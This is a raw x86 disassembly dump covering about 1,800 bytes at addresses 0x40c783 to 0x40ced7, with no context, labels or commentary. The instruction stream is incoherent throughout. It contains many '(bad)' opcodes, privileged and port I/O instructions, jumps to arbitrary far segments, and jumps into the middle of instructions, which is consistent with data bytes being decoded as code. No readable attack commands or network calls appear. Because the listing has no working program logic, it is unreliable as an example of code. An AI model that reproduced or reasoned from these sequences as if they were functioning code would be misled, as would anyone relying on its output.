  40c783:	cmp    ebp,DWORD PTR [ecx+0x1c3b0812]
  40c789:	call   0x8633fe73
  40c78e:	clc    
  40c78f:	shl    DWORD PTR [edi-0x397cbced],1
  40c795:	out    dx,al
  40c796:	shr    BYTE PTR [ebp+0x20e2dafc],cl
  40c79c:	les    esp,FWORD PTR [esi*8+0x3d35285b]
  40c7a3:	add    edi,DWORD PTR [ebx+0x4ab96f44]
  40c7a9:	mov    eax,DWORD PTR [ecx-0x3]
  40c7ac:	pop    ss
  40c7ad:	xor    esi,DWORD PTR [esi-0x16cd390c]
  40c7b3:	jno    0x40c73f
  40c7b5:	mov    BYTE PTR [esi],bl
  40c7b7:	cdq    
  40c7b8:	repz ret 
  40c7ba:	pushf  
  40c7bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7bc:	fsubr  st(6),st
  40c7be:	xchg   esi,eax
  40c7bf:	inc    ebp
  40c7c0:	xchg   edx,eax
  40c7c1:	push   ss
  40c7c2:	(bad)  
  40c7c3:	pop    esi
  40c7c4:	xor    dh,BYTE PTR [edi-0x16f0bd78]
  40c7ca:	adc    eax,0xe1043618
  40c7cf:	xchg   BYTE PTR [ebx+eiz*4+0x66],bl
  40c7d3:	or     BYTE PTR [ebp-0x6e],dl
  40c7d6:	fdivr  QWORD PTR [edx-0x6b4efc2d]
  40c7dc:	inc    ecx
  40c7dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7de:	retf   
  40c7df:	sub    DWORD PTR [ebx-0x21],edi
  40c7e2:	mov    edx,eax
  40c7e4:	xlat   BYTE PTR ds:[ebx]
  40c7e5:	xchg   esp,eax
  40c7e6:	out    dx,al
  40c7e7:	add    eax,0x3cbaf8e5
  40c7ec:	ja     0x40c833
  40c7ee:	loopne 0x40c7ea
  40c7f0:	add    eax,0x8500582b
  40c7f5:	outs   dx,BYTE PTR ds:[esi]
  40c7f6:	in     eax,dx
  40c7f7:	pushf  
  40c7f8:	push   es
  40c7f9:	ret    0x3db8
  40c7fc:	shr    DWORD PTR [edi+eiz*1-0x7e2cabb6],1
  40c803:	and    ecx,DWORD PTR [edi-0x21b4e834]
  40c809:	int    0xc4
  40c80b:	jmp    0x40c818
  40c80d:	sub    ebp,ebp
  40c80f:	test   al,0x81
  40c811:	cdq    
  40c812:	mov    al,ds:0x3efcd99b
  40c817:	in     al,dx
  40c818:	inc    edi
  40c819:	(bad)  
  40c81a:	push   edi
  40c81b:	push   eax
  40c81c:	in     eax,0x2
  40c81e:	pop    ecx
  40c81f:	xlat   BYTE PTR ds:[ebx]
  40c820:	mov    edi,0x415e8d7e
  40c825:	iret   
  40c826:	and    eax,0x86a5116
  40c82b:	out    dx,eax
  40c82c:	xchg   ecx,eax
  40c82d:	mov    esp,0x60aeb845
  40c832:	xor    BYTE PTR [ebx+0x7],cl
  40c835:	cmp    bh,ah
  40c837:	pop    es
  40c838:	aam    0x47
  40c83a:	js     0x40c87a
  40c83c:	ror    DWORD PTR [ebx+esi*1+0x4272122],1
  40c843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c844:	mov    DWORD PTR [eax+0x783ef0e3],esi
  40c84a:	mov    edx,0x13310c8d
  40c84f:	push   ds
  40c850:	push   0x68
  40c852:	imul   edx,DWORD PTR [ebp-0x576afa0b],0xffffffc9
  40c859:	cmp    DWORD PTR [edx],esp
  40c85b:	fstp   st(6)
  40c85d:	jmp    0x40c89b
  40c85f:	test   eax,0x9bee5c33
  40c864:	cs pop edi
  40c866:	stos   BYTE PTR es:[edi],al
  40c867:	pop    esi
  40c868:	iret   
  40c869:	fsubr  QWORD PTR [eax-0x47e14fec]
  40c86f:	jmp    0x40c853
  40c871:	mov    esi,DWORD PTR [ebx+0x7927e16b]
  40c877:	xchg   DWORD PTR ds:0x6104701f,ebp
  40c87d:	push   ecx
  40c87e:	pop    ss
  40c87f:	fidivr WORD PTR [eax-0x50d5488]
  40c885:	sub    DWORD PTR [ebx+edi*8],0xffffff9d
  40c889:	dec    esp
  40c88a:	nop
  40c88b:	rep outs dx,DWORD PTR ds:[esi]
  40c88d:	or     al,cl
  40c88f:	ficomp DWORD PTR [eax]
  40c891:	out    0x8c,eax
  40c893:	sub    al,0x7d
  40c895:	xor    al,0x33
  40c897:	test   DWORD PTR [ebp+0x7e8aa1fd],esp
  40c89d:	add    ecx,DWORD PTR [esi-0x6a637b1f]
  40c8a3:	jo     0x40c843
  40c8a5:	or     edi,edx
  40c8a7:	jae    0x40c837
  40c8a9:	in     eax,dx
  40c8aa:	js     0x40c869
  40c8ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ad:	adc    al,BYTE PTR [eax+0x6ef2756]
  40c8b3:	mov    ebp,0x68df6a17
  40c8b8:	mov    BYTE PTR [ebp+0x58d90228],al
  40c8be:	mov    eax,ds:0xf38b0ca8
  40c8c3:	enter  0xbb2,0xb9
  40c8c7:	jl     0x40c8b2
  40c8c9:	dec    ebp
  40c8ca:	sbb    al,0x1
  40c8cc:	xor    DWORD PTR ds:0x3e744f2e,ecx
  40c8d2:	lahf   
  40c8d3:	mov    ebp,0x228befa4
  40c8d8:	ds pop esp
  40c8da:	out    dx,eax
  40c8db:	out    dx,al
  40c8dc:	cmp    edx,DWORD PTR [edx+eax*8-0x40]
  40c8e0:	dec    edi
  40c8e1:	int3   
  40c8e2:	(bad)  
  40c8e3:	xor    eax,0x5b655572
  40c8e8:	pop    ebp
  40c8e9:	cld    
  40c8ea:	nop
  40c8eb:	jmp    0xc440:0x8d2d4edc
  40c8f2:	jecxz  0x40c907
  40c8f4:	test   al,0x63
  40c8f6:	out    dx,al
  40c8f7:	dec    esp
  40c8f8:	or     eax,0xe4cbf927
  40c8fd:	mov    bh,0xf9
  40c8ff:	out    0x18,eax
  40c901:	ins    BYTE PTR es:[edi],dx
  40c902:	xor    DWORD PTR [esi],ecx
  40c904:	push   ebp
  40c905:	retf   0x7f2d
  40c908:	mov    ebx,DWORD PTR [ebx+edx*8+0x4980f2fe]
  40c90f:	push   cs
  40c910:	mov    ebx,0xf7a88d14
  40c915:	mov    edi,0xe6e56d93
  40c91a:	mov    al,ds:0x6c02086a
  40c91f:	jecxz  0x40c8c0
  40c921:	arpl   WORD PTR [eax+0x241b5612],sp
  40c927:	or     al,0xae
  40c929:	fdivr  DWORD PTR [ebp+0x43]
  40c92c:	or     eax,0x575bf71d
  40c931:	fcmovu st,st(1)
  40c933:	cdq    
  40c934:	pop    ecx
  40c935:	dec    ecx
  40c936:	sbb    BYTE PTR [eax],0xa0
  40c939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c93a:	or     DWORD PTR [esi+eiz*4-0x564a755],ebp
  40c941:	ja     0x40c957
  40c943:	xor    al,0x96
  40c945:	stc    
  40c946:	add    eax,0x1bd39869
  40c94b:	sti    
  40c94c:	stos   BYTE PTR es:[edi],al
  40c94d:	or     BYTE PTR [edi+0x23b8db28],0x13
  40c954:	dec    ebx
  40c955:	cmp    ch,0x8e
  40c958:	inc    esp
  40c959:	or     dl,BYTE PTR [edi]
  40c95b:	inc    edi
  40c95c:	cmp    al,0x11
  40c95e:	inc    ecx
  40c95f:	xchg   edx,eax
  40c960:	ficomp WORD PTR [ebx+ebx*1-0x67a791c9]
  40c967:	in     eax,dx
  40c968:	ins    DWORD PTR es:[edi],dx
  40c969:	out    dx,eax
  40c96a:	pop    esi
  40c96b:	cmp    ebp,ebx
  40c96d:	add    al,0xc5
  40c96f:	gs sbb al,0x99
  40c972:	fldcw  WORD PTR [esi+esi*8]
  40c975:	aam    0xcc
  40c977:	jno    0x40c9f6
  40c979:	sub    ah,BYTE PTR [eax+0x2e65c63f]
  40c97f:	rcl    al,1
  40c981:	add    DWORD PTR [edi+ecx*4],ecx
  40c984:	mov    ebp,DWORD PTR [esi]
  40c986:	jmp    0x680cb669
  40c98b:	mov    WORD PTR [eax+0xd],?
  40c98e:	test   BYTE PTR [ebp+0x645b8e4d],dh
  40c994:	fidiv  WORD PTR [edx]
  40c996:	cwde   
  40c997:	pop    ebp
  40c998:	inc    edx
  40c999:	iret   
  40c99a:	dec    esi
  40c99b:	push   ebp
  40c99c:	and    BYTE PTR [ebp+0x671d171f],dh
  40c9a2:	in     eax,0x55
  40c9a4:	pop    ecx
  40c9a5:	pop    esi
  40c9a6:	sbb    esi,ecx
  40c9a8:	pop    edi
  40c9a9:	fwait
  40c9aa:	push   ds
  40c9ab:	adc    al,0x9b
  40c9ad:	dec    ecx
  40c9ae:	test   BYTE PTR [esi+esi*8-0x57],bh
  40c9b2:	cmp    eax,0xca8bf2d8
  40c9b7:	rol    DWORD PTR [eax],cl
  40c9b9:	sub    eax,0x61c4886b
  40c9be:	xor    bh,BYTE PTR [ebx+eax*4-0x28]
  40c9c2:	and    eax,0xd57d4e33
  40c9c7:	mov    bl,0x1
  40c9c9:	pushf  
  40c9ca:	add    esi,DWORD PTR [esi+ebx*1]
  40c9cd:	cwde   
  40c9ce:	cwde   
  40c9cf:	in     eax,0x7f
  40c9d1:	mov    cx,0xb39d
  40c9d5:	mov    bh,0x73
  40c9d7:	push   eax
  40c9d8:	xor    al,0x6d
  40c9da:	ins    BYTE PTR es:[edi],dx
  40c9db:	mov    ebx,0x7093187e
  40c9e0:	stos   DWORD PTR es:[edi],eax
  40c9e1:	sbb    eax,0x5dda1d91
  40c9e6:	(bad)  
  40c9e7:	push   ebp
  40c9e8:	inc    esi
  40c9e9:	jmp    0xa7cf:0xecf96490
  40c9f0:	adc    eax,0x17555569
  40c9f5:	and    bh,ch
  40c9f7:	dec    ebx
  40c9f8:	loop   0x40ca74
  40c9fa:	test   DWORD PTR [ecx],ecx
  40c9fc:	add    al,0x84
  40c9fe:	pop    ebp
  40c9ff:	and    al,BYTE PTR [edi-0x1e41147e]
  40ca05:	dec    ebx
  40ca06:	in     eax,dx
  40ca07:	(bad)  
  40ca08:	in     eax,0xd3
  40ca0a:	sub    al,0x5f
  40ca0c:	jmp    0xa3222997
  40ca11:	add    eax,0x3734dec3
  40ca16:	xlat   BYTE PTR ds:[ebx]
  40ca17:	sub    dh,bh
  40ca19:	les    ecx,FWORD PTR [eax+0x3ac6ddd6]
  40ca1f:	jns    0x40c9e4
  40ca21:	out    dx,al
  40ca22:	stos   DWORD PTR es:[edi],eax
  40ca23:	add    edi,esp
  40ca25:	xor    BYTE PTR [edx+0x4cd43ec],bl
  40ca2b:	xor    ebp,DWORD PTR [edi+eax*2]
  40ca2e:	cdq    
  40ca2f:	adc    al,0x40
  40ca31:	mov    ah,BYTE PTR [esi]
  40ca33:	hlt    
  40ca34:	xchg   esi,eax
  40ca35:	cmp    DWORD PTR [ecx+0x47],ebp
  40ca38:	fsubr  DWORD PTR [edi-0x3804da7]
  40ca3e:	jns    0x40ca33
  40ca40:	adc    bl,BYTE PTR ds:0xa7b5824c
  40ca46:	mov    DWORD PTR [ecx-0x7dbd7b5a],esi
  40ca4c:	data16 aas 
  40ca4e:	sbb    ch,0x63
  40ca51:	addr16 xor eax,0x645ddf49
  40ca57:	xor    ch,BYTE PTR [edx-0x25]
  40ca5a:	sbb    BYTE PTR [eax+0x7f03c0f7],ah
  40ca60:	test   BYTE PTR [edx+ebx*4-0x9ea6c16],ch
  40ca67:	aaa    
  40ca68:	add    ebx,DWORD PTR [eax-0x7187f310]
  40ca6e:	and    eax,0x4959f948
  40ca73:	dec    edi
  40ca74:	mov    BYTE PTR [edi],al
  40ca76:	pop    edx
  40ca77:	inc    ecx
  40ca78:	repz lahf 
  40ca7a:	ret    
  40ca7b:	jnp    0x40ca4f
  40ca7d:	jg     0x40ca08
  40ca7f:	loop   0x40ca7b
  40ca81:	xor    esi,DWORD PTR [ebx-0x67]
  40ca84:	idiv   BYTE PTR [ebx-0x7f]
  40ca87:	xor    BYTE PTR [ebx],dl
  40ca89:	in     al,dx
  40ca8a:	aad    0xe1
  40ca8c:	loopne 0x40ca9b
  40ca8e:	push   ecx
  40ca8f:	leave  
  40ca90:	push   ebx
  40ca91:	mov    ds:0x1bdf2177,al
  40ca96:	into   
  40ca97:	xchg   BYTE PTR [ecx-0x2a],dl
  40ca9a:	and    DWORD PTR [ecx+esi*8-0x74],edx
  40ca9e:	pop    esi
  40ca9f:	push   eax
  40caa0:	loope  0x40ca42
  40caa2:	mov    edi,0x46973e09
  40caa7:	sar    BYTE PTR [ebx],0x54
  40caaa:	out    0x4e,eax
  40caac:	inc    esp
  40caad:	pusha  
  40caae:	aad    0x32
  40cab0:	sti    
  40cab1:	mov    BYTE PTR ds:0x767cf3bb,ch
  40cab7:	iret   
  40cab8:	dec    esp
  40cab9:	int    0x26
  40cabb:	ins    BYTE PTR es:[edi],dx
  40cabc:	lods   al,BYTE PTR ds:[esi]
  40cabd:	jo     0x40cabd
  40cabf:	sub    bh,dh
  40cac1:	jg     0x40cafe
  40cac3:	pop    eax
  40cac4:	or     eax,0xefa42bc4
  40cac9:	lock jle 0x40ca77
  40cacc:	jns    0x40cb20
  40cace:	cmp    edx,DWORD PTR [ebp+0x215cc9fe]
  40cad4:	ins    DWORD PTR es:[edi],dx
  40cad5:	pop    edi
  40cad6:	sub    eax,0x8efb998c
  40cadb:	dec    ebp
  40cadc:	cmc    
  40cadd:	mov    al,ds:0x263b5155
  40cae2:	cmp    BYTE PTR [ecx],ah
  40cae4:	sbb    edi,DWORD PTR [ebp+0x3d93e29f]
  40caea:	mov    esi,0x8526143e
  40caef:	mov    BYTE PTR [edx+0x1682f949],bh
  40caf5:	dec    esi
  40caf6:	inc    esp
  40caf7:	pop    esp
  40caf8:	mov    dl,0x60
  40cafa:	retf   
  40cafb:	mov    WORD PTR [ebp-0xf],ds
  40cafe:	mul    BYTE PTR [ebx-0x7]
  40cb01:	mov    esp,0x99bbef6d
  40cb06:	lods   eax,DWORD PTR ds:[esi]
  40cb07:	out    0x3a,al
  40cb09:	sbb    cl,dl
  40cb0b:	add    eax,0x12da1dc2
  40cb10:	stc    
  40cb11:	in     eax,0xeb
  40cb13:	jae    0x40cb8a
  40cb15:	pop    ss
  40cb16:	inc    DWORD PTR [ebp+0x5d]
  40cb19:	and    BYTE PTR [edx-0x31],dh
  40cb1c:	scas   al,BYTE PTR es:[edi]
  40cb1d:	dec    edi
  40cb1e:	pop    ss
  40cb1f:	test   ah,bh
  40cb21:	aad    0x69
  40cb23:	scas   al,BYTE PTR es:[edi]
  40cb24:	sub    DWORD PTR [ebx-0x9],edx
  40cb27:	inc    ebx
  40cb28:	les    edx,FWORD PTR [edi]
  40cb2a:	pop    esi
  40cb2b:	add    ebx,DWORD PTR [ebp+0x93ffc01]
  40cb31:	and    BYTE PTR [edi-0x2a],0x89
  40cb35:	cmp    ebp,esi
  40cb37:	call   0x13ac5a99
  40cb3c:	or     DWORD PTR [esi+0x8],edi
  40cb3f:	mov    cl,0xa
  40cb41:	(bad)  
  40cb42:	sti    
  40cb43:	inc    edi
  40cb44:	jge    0x40cb13
  40cb46:	pop    edx
  40cb47:	add    esp,edx
  40cb49:	cmp    eax,0x22610a26
  40cb4e:	sbb    DWORD PTR [ecx*4+0x7d33b9c8],edx
  40cb55:	ds inc ebx
  40cb57:	mov    ds:0xad572df,al
  40cb5c:	rdpmc  
  40cb5e:	mov    DWORD PTR [ebp+0x72],ebp
  40cb61:	add    ecx,edi
  40cb63:	js     0x40cb32
  40cb65:	test   BYTE PTR [esi+0x5b],dl
  40cb68:	(bad)  
  40cb69:	popa   
  40cb6a:	jbe    0x40cb49
  40cb6c:	test   eax,0x2fd2b1e6
  40cb71:	mov    dh,0x48
  40cb73:	mov    ebx,esi
  40cb75:	imul   edi,DWORD PTR [ecx+ebp*2+0x4d47e8f0],0x58
  40cb7d:	inc    esi
  40cb7e:	ficom  WORD PTR [ebx+0x47294221]
  40cb84:	jmp    0x40cb4f
  40cb86:	dec    ebp
  40cb87:	adc    BYTE PTR [edi],dh
  40cb89:	data16 mov cl,0x78
  40cb8c:	mov    eax,fs:0x735310a0
  40cb92:	xchg   esp,eax
  40cb93:	ds and bh,dh
  40cb96:	add    al,0x6f
  40cb98:	test   BYTE PTR [eax+0xd94955a],bh
  40cb9e:	(bad)  
  40cb9f:	pop    ebx
  40cba0:	(bad)  
  40cba1:	cwde   
  40cba2:	push   ss
  40cba3:	not    DWORD PTR [ecx+esi*2+0x86d56ee]
  40cbaa:	nop
  40cbab:	sub    edi,esi
  40cbad:	and    BYTE PTR [esi+esi*8-0x18],0xd8
  40cbb2:	cmp    eax,ebp
  40cbb4:	ins    DWORD PTR es:[edi],dx
  40cbb5:	faddp  st(1),st
  40cbb7:	int3   
  40cbb8:	mov    eax,cs:0x5a47e296
  40cbbe:	lds    esp,FWORD PTR [edi+edx*8-0x40]
  40cbc2:	mov    ds:0xe57af8dd,al
  40cbc7:	mov    WORD PTR [esi+eiz*1-0x395fe393],cs
  40cbce:	fs and al,0x60
  40cbd1:	pop    edx
  40cbd2:	add    al,0xea
  40cbd4:	test   al,0xec
  40cbd6:	pop    es
  40cbd7:	int    0xa0
  40cbd9:	sbb    al,0xb1
  40cbdb:	fsub   QWORD PTR [edx-0x40]
  40cbde:	xchg   ebx,eax
  40cbdf:	fidivr DWORD PTR [esi+eax*4+0x5c8e06c9]
  40cbe6:	inc    esp
  40cbe7:	fistp  QWORD PTR [edi]
  40cbe9:	addr16 call 0x1c33fa8b
  40cbef:	xchg   ecx,eax
  40cbf0:	pop    ss
  40cbf1:	int    0xf7
  40cbf3:	add    eax,0xfa5c5f9
  40cbf8:	dec    esp
  40cbf9:	xor    eax,DWORD PTR [esi]
  40cbfb:	jmp    0x40cb9f
  40cbfd:	jno    0x40cc67
  40cbff:	push   ebx
  40cc00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc01:	pop    ss
  40cc02:	iret   
  40cc03:	sub    BYTE PTR [edi],al
  40cc05:	into   
  40cc06:	push   cs
  40cc07:	inc    ebp
  40cc08:	psllw  mm6,QWORD PTR [ebp*2-0x7445ab03]
  40cc10:	popa   
  40cc11:	and    BYTE PTR [ebp+0x36],ch
  40cc14:	ds jmp 0xc06d4f47
  40cc1a:	jle    0x40cba4
  40cc1c:	jmp    0x40cc28
  40cc1e:	ja     0x40cc91
  40cc20:	sub    edi,DWORD PTR [ebp+0x32b51d5c]
  40cc26:	pop    ecx
  40cc27:	mov    ecx,0x685e113a
  40cc2c:	fidiv  WORD PTR [ebx+0x7]
  40cc2f:	cwde   
  40cc30:	dec    DWORD PTR ds:0x85efdf22
  40cc36:	retf   
  40cc37:	jns    0x40cc74
  40cc39:	int3   
  40cc3a:	inc    edi
  40cc3b:	cmp    eax,0x1d0aca4f
  40cc40:	rcl    DWORD PTR [bx+di],0x2e
  40cc44:	push   ds
  40cc45:	mov    dh,0x9e
  40cc47:	mov    eax,0x536b1868
  40cc4c:	pusha  
  40cc4d:	pop    es
  40cc4e:	sbb    ah,BYTE PTR [eax+0x62105c3c]
  40cc54:	xchg   edi,eax
  40cc55:	retf   
  40cc56:	fst    QWORD PTR [eax-0x4eb8acdb]
  40cc5c:	cmp    eax,0x4443c226
  40cc61:	cwde   
  40cc62:	xor    DWORD PTR [edx+eiz*4+0x47],ebx
  40cc66:	scas   al,BYTE PTR es:[edi]
  40cc67:	cli    
  40cc68:	daa    
  40cc69:	mov    ds:0x8e1c8336,eax
  40cc6e:	cmp    edx,DWORD PTR [ecx+edi*2-0x3e]
  40cc72:	inc    ecx
  40cc73:	add    eax,DWORD PTR [edi-0x3b]
  40cc76:	inc    ebx
  40cc77:	mov    cs,WORD PTR [edi+0x7881379]
  40cc7d:	pop    edx
  40cc7e:	jmp    0x40cc2a
  40cc80:	adc    cl,bl
  40cc82:	je     0x40ccea
  40cc84:	xor    al,0x4a
  40cc86:	out    0x67,eax
  40cc88:	adc    esp,eax
  40cc8a:	fcomp  DWORD PTR [edi]
  40cc8c:	ss jno 0x40cca9
  40cc8f:	in     eax,dx
  40cc90:	setl   BYTE PTR [edx-0x11]
  40cc94:	bound  eax,QWORD PTR [edi+edx*4-0x1cdecde4]
  40cc9b:	das    
  40cc9c:	stc    
  40cc9d:	push   eax
  40cc9e:	add    eax,0x70e15e87
  40cca3:	inc    esi
  40cca4:	pop    es
  40cca5:	(bad)  
  40cca6:	mov    ebp,0xde29dd05
  40ccab:	ficom  WORD PTR [edx+eiz*2-0x2]
  40ccaf:	pop    eax
  40ccb0:	leave  
  40ccb1:	aas    
  40ccb2:	adc    dl,ch
  40ccb4:	aad    0x41
  40ccb6:	or     esp,DWORD PTR [esi-0x4dfa3c68]
  40ccbc:	inc    ecx
  40ccbd:	adc    al,0x78
  40ccbf:	push   ds
  40ccc0:	je     0x40cd1f
  40ccc2:	mov    eax,0xc336f465
  40ccc7:	scas   eax,DWORD PTR es:[edi]
  40ccc8:	mov    WORD PTR [ebx-0x7d],fs
  40cccb:	and    ch,BYTE PTR [ebx-0x5b]
  40ccce:	mov    dh,0x2d
  40ccd0:	cs fsubr st,st(7)
  40ccd3:	int3   
  40ccd4:	adc    eax,0xf4e8d494
  40ccd9:	pop    ss
  40ccda:	lds    edx,FWORD PTR [ebp+0x6c]
  40ccdd:	cmp    al,0xf
  40ccdf:	jo     0x40cce3
  40cce1:	call   0xa80e:0xcf479fb2
  40cce8:	add    eax,0xc2ebf358
  40cced:	cdq    
  40ccee:	jmp    0x40ccc2
  40ccf0:	cld    
  40ccf1:	inc    eax
  40ccf2:	fild   DWORD PTR [edx+0x5e3de3e8]
  40ccf8:	cld    
  40ccf9:	pop    ss
  40ccfa:	mov    esp,0x7d9be680
  40ccff:	clc    
  40cd00:	ret    0xb159
  40cd03:	outs   dx,BYTE PTR ds:[esi]
  40cd04:	ds jmp 0x40cd19
  40cd07:	dec    esi
  40cd08:	mov    bl,0x79
  40cd0a:	xchg   edx,eax
  40cd0b:	inc    ebx
  40cd0c:	sbb    ebx,DWORD PTR es:[ecx-0x5a]
  40cd10:	push   edx
  40cd11:	leave  
  40cd12:	je     0x40cd45
  40cd14:	add    BYTE PTR fs:[esi+0x46],0x26
  40cd19:	repz mov bl,0x8c
  40cd1c:	test   BYTE PTR [ecx],cl
  40cd1e:	mov    dl,0x4f
  40cd20:	mov    edx,0x9c223e6e
  40cd25:	lahf   
  40cd26:	sbb    BYTE PTR [edi-0x78bb3b01],ch
  40cd2c:	(bad)  
  40cd2d:	mov    ah,BYTE PTR [edx]
  40cd2f:	sahf   
  40cd30:	xchg   edx,eax
  40cd31:	xchg   esi,edx
  40cd33:	(bad)  
  40cd36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd37:	mov    ebp,0x3638b855
  40cd3c:	std    
  40cd3d:	xchg   ebx,eax
  40cd3e:	xchg   esi,eax
  40cd3f:	pop    es
  40cd40:	push   edi
  40cd41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd42:	jbe    0x40cdac
  40cd44:	xchg   esi,eax
  40cd45:	dec    ecx
  40cd46:	test   al,0x57
  40cd48:	inc    edi
  40cd49:	bound  edi,QWORD PTR [ecx+0x5c]
  40cd4c:	es aam 0x64
  40cd4f:	lods   eax,DWORD PTR ds:[esi]
  40cd50:	add    al,0x13
  40cd52:	xchg   esi,eax
  40cd53:	and    ebx,DWORD PTR [ebx-0x144ae20b]
  40cd59:	push   ss
  40cd5a:	and    DWORD PTR [ebx-0x56],ecx
  40cd5d:	in     al,dx
  40cd5e:	jo     0x40cce6
  40cd60:	dec    edx
  40cd61:	mov    al,ah
  40cd63:	or     dh,BYTE PTR [eax+0x67]
  40cd66:	js     0x40cda4
  40cd68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd69:	test   DWORD PTR [ecx+0x23],esp
  40cd6c:	adc    al,0xc5
  40cd6e:	test   DWORD PTR [ecx-0x31a9e5d1],ecx
  40cd74:	xor    ebx,0x5f4703f1
  40cd7a:	int3   
  40cd7b:	mov    es,WORD PTR cs:[ebx-0x765ad222]
  40cd82:	sbb    esp,ecx
  40cd84:	cmc    
  40cd85:	ins    BYTE PTR es:[edi],dx
  40cd86:	cmc    
  40cd87:	sahf   
  40cd88:	push   ecx
  40cd89:	mov    ch,0xb
  40cd8b:	xor    eax,0xe3521339
  40cd90:	xchg   edi,ebp
  40cd92:	cmp    al,BYTE PTR [ecx-0x4a]
  40cd95:	and    BYTE PTR ds:0x693ad031,ch
  40cd9b:	ret    0x845f
  40cd9e:	push   ebx
  40cd9f:	sub    ch,BYTE PTR [edi+0x7cecbda]
  40cda5:	retf   
  40cda6:	mov    ebx,0xda23edbb
  40cdab:	popa   
  40cdac:	fcomp  QWORD PTR [esi+ebp*8-0x6dc5623]
  40cdb3:	jmp    0x40cde0
  40cdb5:	push   cs
  40cdb6:	or     dl,ch
  40cdb8:	outs   dx,BYTE PTR ds:[esi]
  40cdb9:	ror    BYTE PTR [esi],0x30
  40cdbc:	sub    dh,BYTE PTR [edi+0x3a]
  40cdbf:	dec    edi
  40cdc0:	retf   
  40cdc1:	(bad)  
  40cdc2:	sbb    dh,BYTE PTR [esi+0x4d]
  40cdc5:	in     al,0xd2
  40cdc7:	jle    0x40cdb9
  40cdc9:	bnd gs jno 0x40cd8a
  40cdcd:	mov    ds:0x7e77594,al
  40cdd2:	xchg   ebx,eax
  40cdd3:	sbb    al,0xea
  40cdd5:	mov    bh,0xd2
  40cdd7:	outs   dx,BYTE PTR ds:[esi]
  40cdd8:	pop    ss
  40cdd9:	ds call 0xa98d:0x4a35f380
  40cde1:	scas   eax,DWORD PTR es:[edi]
  40cde2:	adc    bl,bh
  40cde4:	retf   0xbbba
  40cde7:	inc    ebp
  40cde8:	std    
  40cde9:	push   eax
  40cdea:	dec    ebp
  40cdeb:	and    DWORD PTR [eax-0x18c709a5],esi
  40cdf1:	(bad)  
  40cdf2:	test   al,0x76
  40cdf4:	arpl   WORD PTR [esi],sp
  40cdf6:	add    bl,ah
  40cdf8:	(bad)  [edi+0x4a]
  40cdfb:	fld    DWORD PTR [edx-0x2]
  40cdfe:	nop
  40cdff:	adc    eax,0xba5255de
  40ce04:	pop    edi
  40ce05:	mov    dh,0xa2
  40ce07:	mov    bl,0x47
  40ce09:	dec    ecx
  40ce0a:	js     0x40ce0b
  40ce0c:	std    
  40ce0d:	call   0x4694:0xd6fe44f2
  40ce14:	mov    gs,edi
  40ce16:	sub    al,0x2
  40ce18:	xchg   esi,eax
  40ce19:	inc    ebp
  40ce1a:	loop   0x40ce46
  40ce1c:	mov    esi,0x881218f9
  40ce21:	pop    es
  40ce22:	ds inc ecx
  40ce24:	ret    
  40ce25:	hlt    
  40ce26:	mov    esi,DWORD PTR [edi]
  40ce28:	sbb    edi,DWORD PTR [eax*2-0x6431d2e9]
  40ce2f:	push   edi
  40ce30:	test   DWORD PTR [edx],ecx
  40ce32:	shr    DWORD PTR [eax-0x201a7584],1
  40ce38:	add    edx,edx
  40ce3a:	xor    BYTE PTR [eax-0x24],cl
  40ce3d:	cwde   
  40ce3e:	add    al,0x89
  40ce40:	cs das 
  40ce42:	xchg   esi,eax
  40ce43:	sub    ah,BYTE PTR [edi]
  40ce45:	xchg   eax,ebp
  40ce47:	cmc    
  40ce48:	aaa    
  40ce49:	or     al,0xf4
  40ce4b:	mov    edx,0x3a009341
  40ce50:	or     BYTE PTR [ebx],dh
  40ce52:	inc    esi
  40ce53:	mov    eax,0xe9c37a70
  40ce58:	test   eax,0x200a3df6
  40ce5d:	leave  
  40ce5e:	xchg   edx,eax
  40ce5f:	call   0x68e7fc19
  40ce64:	xor    DWORD PTR [ecx+ebx*4],0x4e
  40ce68:	dec    ecx
  40ce69:	mov    dh,0xff
  40ce6b:	mov    ah,0x7
  40ce6d:	pushf  
  40ce6e:	xchg   esp,eax
  40ce6f:	push   0x7e
  40ce71:	(bad)  
  40ce72:	push   ds
  40ce73:	push   0x40e4ee71
  40ce78:	lea    ebx,[edi-0x44688136]
  40ce7e:	mov    dl,0x9c
  40ce80:	mov    bh,0x19
  40ce82:	mov    dh,0xf1
  40ce84:	scas   al,BYTE PTR es:[edi]
  40ce85:	mov    eax,ds:0x91aacce1
  40ce8a:	xor    ebp,DWORD PTR [ebx+0x6b]
  40ce8d:	clc    
  40ce8e:	idiv   DWORD PTR [esi+ebx*2+0xe]
  40ce92:	fs cwde 
  40ce94:	inc    esp
  40ce95:	inc    esp
  40ce96:	pop    esi
  40ce97:	pop    eax
  40ce98:	fcom   QWORD PTR [esi]
  40ce9a:	stc    
  40ce9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce9c:	lods   al,BYTE PTR ds:[esi]
  40ce9d:	sbb    eax,edx
  40ce9f:	or     al,0x67
  40cea1:	in     al,dx
  40cea2:	arpl   WORD PTR [esi+0x7f77482a],bp
  40cea8:	pop    esp
  40cea9:	in     al,dx
  40ceaa:	dec    ecx
  40ceab:	popa   
  40ceac:	stc    
  40cead:	push   esi
  40ceae:	add    ecx,DWORD PTR [esi+0x63]
  40ceb1:	add    eax,0x5ea5a25e
  40ceb6:	jl     0x40ce4c
  40ceb8:	scas   al,BYTE PTR es:[edi]
  40ceb9:	outs   dx,DWORD PTR ds:[esi]
  40ceba:	stc    
  40cebb:	fwait
  40cebc:	mov    ah,0xb9
  40cebe:	bnd jae 0x40cea9
  40cec1:	adc    DWORD PTR [eax],ebx
  40cec3:	and    ebx,ecx
  40cec5:	pop    esp
  40cec6:	pavgb  mm2,QWORD PTR [ecx+0x4c5e7eaa]
  40cecd:	cmp    ah,dh
  40cecf:	div    dh
  40ced1:	push   ebx
  40ced2:	je     0x40cf3f
  40ced4:	mov    ah,0x86
  40ced6:	push   ebp
  40ced7:	sub    DWORD PTR [eax+0x5bf7a7dc],eax
